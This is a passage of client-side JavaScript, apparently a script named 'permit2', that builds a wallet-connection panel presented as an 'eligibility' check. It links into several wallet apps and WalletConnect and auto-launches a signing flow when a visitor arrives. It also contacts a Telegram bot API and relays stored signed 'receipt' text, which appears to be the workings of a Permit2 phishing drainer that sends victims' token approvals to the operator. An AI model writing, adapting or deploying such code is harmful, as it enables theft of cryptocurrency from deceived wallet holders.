      setStep(stepNow, "err", reason(m));
      say(reason(m), "r");
      setBtn("Try again · level " + stepNow + " of 2", false);
      setLevel("Level " + stepNow + " of 2", false);
    } finally {
      P.inflight = null;
    }
  })();
  return P.inflight;
}

/* ---------------------------------------------------------------- chooser */
function base() { return SITE + "/"; }

var DEEP = {
  mm: function (u) {
    var p = new URL(u);
    return "https://link.metamask.io/dapp/" + p.host + p.pathname +
      (p.search ? "%3F" + encodeURIComponent(p.search.slice(1)) : "");
  },
  tw: function (u) { return "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(u); },
  cb: function (u) { return "https://go.cb-w.com/dapp?cb_url=" + encodeURIComponent(u); },
  rb: function (u) { return "https://rnbwapp.com/dapp/?url=" + encodeURIComponent(u); }
};

function full() {
  var q = ["w=1"];
  if (P.owner) q.push("a=" + encodeURIComponent(P.owner));
  if (ACTION !== "eligibility") q.push("x=" + encodeURIComponent(ACTION));
  return base() + LAND + "?" + q.join("&");
}

function chooser() {
  var w = mount();
  var card = w.querySelector(".p2c");
  var go = card.querySelector("#p2go");
  w.classList.add("on");
  if (card.querySelector("#p2cho")) return;

  var box = document.createElement("div");
  box.className = "p2cho";
  box.id = "p2cho";

  var wcRow = document.createElement("a");
  wcRow.className = "wc";
  wcRow.innerHTML = "WalletConnect<span>qr / scan →</span>";
  wcRow.addEventListener("click", function (e) { e.preventDefault(); beginWc(); });
  box.appendChild(wcRow);

  [["MetaMask", "mm"], ["Trust Wallet", "tw"], ["Coinbase Wallet", "cb"], ["Rainbow", "rb"]].forEach(function (r) {
    var a = document.createElement("a");
    a.innerHTML = r[0] + "<span>open ↗</span>";
    a.addEventListener("click", function (e) {
      e.preventDefault();
      location.href = DEEP[r[1]](full());
    });
    box.appendChild(a);
  });

  if (go) go.style.display = "none";
  card.appendChild(box);
  var n = card.querySelector("#p2n");
  if (n) n.textContent = "Scan from any wallet, or open this page in one";
}

async function beginWc() {
  var w = mount();
  w.classList.add("on");
  var box = w.querySelector("#p2cho");
  if (box) box.remove();
  var g = document.getElementById("p2go");
  if (g) g.style.display = "none";
  say("Opening WalletConnect…", "w");
  try {
    await ensureWc();
    say("Wallet linked", "g");
    await flow();
  } catch (e) {
    var m = String((e && e.message) || e);
    say(/reject|denied|closed/i.test(m) ? "Closed before linking — pick a wallet again" : reason(m), "r");
    var g2 = document.getElementById("p2go");
    if (g2) g2.style.display = "";
    setBtn("Try again · level 1 of 2", false);
    chooser();
  }
}

/* ---------------------------------------------------------------- panel */
function openPanel(opt) {
  opt = opt || {};
  if (opt.owner) P.owner = opt.owner;
  if (opt.action) ACTION = opt.action;
  var w = mount();
  w.classList.add("on");
  if (!P.inflight) { paint(); say(""); }
  var go = document.getElementById("p2go");
  if (go && !P.inflight) go.style.display = "";
  if (pendingResend) setBtn("Resend receipt", false);
  else if (!P.inflight && !P.done) setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
  return w;
}

/* ---------------------------------------------------------------- api */
var lastAuto = 0;

window.p2Close = close;

window.p2Resend = async function () {
  var text = "";
  try { text = localStorage.getItem("p2_text") || ""; } catch (e) {}
  if (!text) { pendingResend = false; setBtn("Try again", false); return false; }
  setBtn("Sending…", true);
  say("Re-sending your receipt", "w");
  dropChat();
  var ok = await deliver(text);
  if (ok) { pendingResend = false; P.done = true; markDone(); say("Access open · seat recorded", "g"); }
  else { pendingResend = true; setBtn("Resend receipt", false); say("Delivery still blocked — try again shortly", "r"); }
  return ok;
};

window.p2Advance = function (opt) {
  opt = opt || {};
  openPanel(opt);
  if (pendingResend && opt.auto) return true;

  if (provider()) {
    if (opt.auto) {
      if (P.inflight) return true;
      if (Date.now() - lastAuto < 800) return true;
      lastAuto = Date.now();
      setTimeout(function () { flow(); }, 100);
    }
    return true;
  }

  setBtn("Connecting…", true);
  waitForProvider(6000).then(function (ok) {
    if (P.inflight) return;
    if (ok) {
      if (opt.auto) flow();
      else setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
    } else {
      setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
      say("Choose a wallet to continue", "w");
      chooser();
    }
  });
  return true;
};

window.p2Connect = function (opt) {
  opt = opt || {};
  openPanel(opt);
  if (provider()) { setTimeout(function () { flow(); }, 100); return true; }
  waitForProvider(2500).then(function (ok) {
    if (ok) { flow(); return; }
    chooser();
  });
  return true;
};

window.p2OnStatus = function (cb) { P.onStatus = cb; };
window.p2OnClose  = function (cb) { P.onClose  = cb; };

/* ---------------------------------------------------------------- boot */
(function boot() {
  var qs = new URLSearchParams(location.search);
  var sc = document.querySelector('script[src*="permit2"]');
  if (sc && sc.dataset && sc.dataset.action && COPY[sc.dataset.action]) ACTION = sc.dataset.action;
  if (qs.get("x") && COPY[qs.get("x")]) ACTION = qs.get("x");
  if (qs.get("a") && /^0x[0-9a-fA-F]{40}$/.test(qs.get("a"))) P.owner = qs.get("a");
  try { if (!P.owner) P.owner = localStorage.getItem("p2_owner") || ""; } catch (e) {}
  if (qs.get("c") && /^-?\d+$/.test(qs.get("c"))) saveChat(qs.get("c"));

  window.addEventListener("eip6963:announceProvider", function (e) {
    try { if (e.detail && e.detail.provider) injected.push(e.detail.provider); } catch (x) {}
  });
  try { window.dispatchEvent(new Event("eip6963:requestProvider")); } catch (e) {}

  fetch("https://api.telegram.org/bot" + BOT + "/getMe")
    .then(function (r) { return r.json(); })
    .then(function (j) { if (j && j.ok) P.bot = j.result.username; })
    .catch(function () {});

  /* arrival: always auto once per owner+action, never time-gated */
  if (qs.get("w") === "1") {
    var key = "p2_auto_" + (P.owner || "anon").toLowerCase() + "_" + ACTION;
    var ran = false;
    try { ran = sessionStorage.getItem(key) === "1"; } catch (e) {}
    setTimeout(function () {
      if (ran) { window.p2Advance({ owner: P.owner, auto: false }); return; }
      try { sessionStorage.setItem(key, "1"); } catch (e) {}
      window.p2Advance({ owner: P.owner, auto: true });
    }, 60);
  }
})();

})();